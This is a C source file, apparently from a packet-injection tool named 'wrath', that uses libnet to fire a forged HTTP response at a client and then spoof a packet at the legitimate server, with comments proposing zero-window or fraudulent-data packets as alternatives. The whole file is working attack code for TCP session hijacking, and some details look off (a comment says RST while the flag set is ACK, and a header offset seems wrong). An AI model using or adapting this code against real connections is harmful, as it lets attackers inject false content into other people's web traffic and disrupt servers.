#include <libnet.h>
#include "wrath-builders.h"
#include "wrath-structs.h"

/* This assumes packets are being filtered where the client is the source. */
void wrath_launch_http_response(u_char *data_pass, u_char *packet, u_char *payload, int increment) {
	// craft response packet and fire
	wrath_tcp_belly_build_and_launch(data_pass, packet, payload, (TH_PUSH + TH_ACK), increment);

	printf("Firing RST Packet at legitimate server\n");
	struct lcp_package *package = (struct lcp_package *) data_pass;
	libnet_t *libnet_handle = package->libnet_handle;

	// craft rst packet at legitimate server and fire
	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	libnet_build_tcp(
	ntohs(tcphdr->th_sport),	// source port (preted to be from destination port)
	ntohs(tcphdr->th_dport),	// destination port (pretend to be from source port)
	ntohl(tcphdr->th_seq + increment), 		// seq
	ntohl(tcphdr->th_ack),		// ack
	TH_ACK,				// flags
	0,				// window size
	0,				// checksum: 0 = libnet auto-fill
	0,				// URG pointer	
	0,				// len
	NULL,				// *payload 
	0,				// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_src.s_addr,  		// source (pretend to be destination)
	iphdr->ip_dst.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	

	libnet_write(libnet_handle);

	// OR craft window 0 packet at legitimate server and fire
	// OR craft extra data, fraudulent data at legitimate server and fire

}
